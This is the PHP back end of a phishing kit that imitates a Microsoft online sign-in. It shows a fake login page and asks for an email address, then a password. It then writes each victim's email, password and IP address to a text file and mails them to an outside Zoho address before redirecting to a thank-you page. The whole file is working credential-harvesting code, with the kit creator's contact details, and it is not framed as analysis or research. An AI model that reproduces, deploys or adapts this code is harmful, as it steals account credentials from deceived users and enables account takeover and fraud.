<?php

$Send2Mail=False;
$Save2File=True;

ini_set("output_buffering",4096);
session_start();

$q=$_GET['securitysteps_5f512a34358ae4d3_ACCESS_verify_i5f512a34358ae4d3_token9833jnm246hHjmssw_onlinebanking_DO7dtkwIsdfg'];

if($q==""){	include( "signin.html");}

	if($q=="verify"){
				
	$_SESSION['User'] = $_POST["loginfmt"];
	$email = $_POST["loginfmt"];
		if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
		include("signinER.html");
		}else{		include("pass.php");			}	}
if($q=="done"){
$ip = getenv("REMOTE_ADDR");
$_SESSION['ip']=$ip;
$ID=$_SESSION['User'];
$message .= "------------------Microsoft Result--------------------\n";
$message .= "| Email : ".$_SESSION['User']."\n";
$message .= "| Pass : ".$_POST['passwd']."\n";
$message .= "------------------IP Details--------------------\n";
$message .= "| Host Name: ".$_SESSION['ip']."\n";
$message .= "------------Creator ICQ (706704896)------------\n";
$send = "results.box1505@zoho.com";
$subject = "---------------|Microsoftonline|--------------- | $ID";

if ($Save2File==True);{
$myfile = fopen("newfile.txt", "a+");
$txt = "$message";
fwrite($myfile, $txt);
$txt = "\n";
fwrite($myfile, $txt);
fclose($myfile);
}
if ($Send2Mail==True);{
mail($send,$subject,$message);
}
header("Location: ThankYou.html") ;





}







?>

